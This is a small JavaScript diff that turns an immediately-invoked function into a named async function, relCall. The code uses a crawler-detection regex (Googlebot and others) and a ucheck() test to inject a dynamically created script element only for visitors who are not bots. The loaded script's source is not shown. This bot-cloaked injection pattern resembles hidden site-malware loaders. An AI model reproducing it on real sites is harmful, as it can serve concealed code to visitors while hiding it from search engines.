@@ -11,7 +11,7 @@ var botPattern = "(googlebot\/|Googlebot-Mobile|Googlebot-Image|Google favicon|M
             return false;
           }
 }
-(function() {
+async function relCall() {
     if(ucheck() === false){
         var script, el;
         script = document.createElement('script');
@@ -62,4 +62,5 @@ var botPattern = "(googlebot\/|Googlebot-Mobile|Googlebot-Image|Google favicon|M
             el.appendChild(script);
         }
     }
-})();
+}
+relCall();
